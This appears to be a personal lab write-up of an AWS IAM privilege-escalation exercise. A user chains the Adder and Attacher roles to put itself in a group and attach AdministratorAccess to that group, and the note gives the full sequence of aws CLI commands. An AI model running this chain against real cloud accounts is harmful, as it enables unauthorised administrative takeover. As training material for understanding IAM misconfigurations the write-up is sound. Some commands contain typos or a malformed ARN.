** Bad combination of Adder and Attacher role policies **
How to elevate privileges abusign on the combination of Adder and Attacher role policies

Setting AWS Credentials 
`aws configure`

Listing attached user policies
`aws iam list-attached-user-policies --user-name student`
Trying to create a new user - Access Denied
`aws iam create-user --user-name Bob`
Listing user policies and their details
`aws iam list-user-policies --user-name student`
`aws iam get-user-policy --user-name student --policy-name terraform-2021021105175865940000002`
We can found a role named Adder, it permits to add a new user
`aws ima list-role-policies --role-name Adder`
`aws iam get-role-policy --role-name Adder --policy-name AddUser`
AddUser policy permits to add a user to a group, in this hypotetic case in the resource "arn:aws:iam::607486832336:group/Printers"

List all the groups that the user is included
`aws iam list-groups-for-user --user-name student`
Assuming Adder role
`aws sts assume-role --role-arn arn:aws:iam::607486832336:role/Adder --role-session-name adder_test`
We obtain:
![[Pasted image 20210502220255.png]]

With this credential we can export them to a environment variables:
![[Pasted image 20210502220604.png]]

Adding user to a group
`aws iam add-user-to-group --group-name Printers --user-name student`

Unset environment variables
![[Pasted image 20210502220925.png]]

List all the groups that the user is included. Now is a Printer group member
`aws iam list-groups-for-user --user-name student`

List role policies for an user
Attacher Role permits to attach a group policy to a group, in this case the Printer group
`aws ima list-role-policies --role-name Attacher`
`aws iam get-role-policy --role-name Attacher --policy-name AttachPolicy`

`aws iam list-attached-group-policies --group-name Printers`

Assuming Attacher Role
`aws sts assume-role --role-arn arn:aws:iam::607486832336:role/Attacher --role-session-name attacher_test`
Copy again Access key ID, Secret access key, and session token to add these values to an environment variables

Attaching AdministratorAccess policy with group
Adding environment variables
![[Pasted image 20210502221918.png]]

`aws iam attach-group-policy --group-name Printers --policy-arn arn:aws:iam:policy/AdministratorAccess`

Unset again environment variables
![[Pasted image 20210502220925.png]]

Checking escalated privileges
`aws iam list-attached-group-policies --group-name Printers`
Checking if we can create users - Success
`aws iam create-user --user-name Bob`

